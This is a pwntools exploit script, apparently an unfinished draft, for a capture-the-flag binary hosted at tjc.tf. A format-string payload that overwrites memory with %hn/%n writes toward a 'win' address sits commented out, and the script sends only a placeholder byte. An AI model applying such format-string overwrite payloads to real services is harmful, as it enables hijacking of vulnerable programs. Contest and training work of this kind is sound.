#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+100

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('tjc.tf', 31764)
else:
    p = process(exe.path)

GDB()
rw_section = 0x403a00
win = 0x86a693c
part1 = 0x86a
part2 = 0x693c

# payload = f"%{part1}c%11$hn".encode()
# payload += f"%{part2 - part1}c%12$hn".encode()
# payload += f"%{rw_section - part2 -part1 + 2154}c%13$n".encode()
# payload = payload.ljust(40)
# payload += p64(0x00000000403a00 + 2)
# payload += p64(0x00000000403a00)
# payload += p64(0x403440)
payload  = b"a"
sla(b"(or else): ", payload)
# p.recvall()
p.interactive()
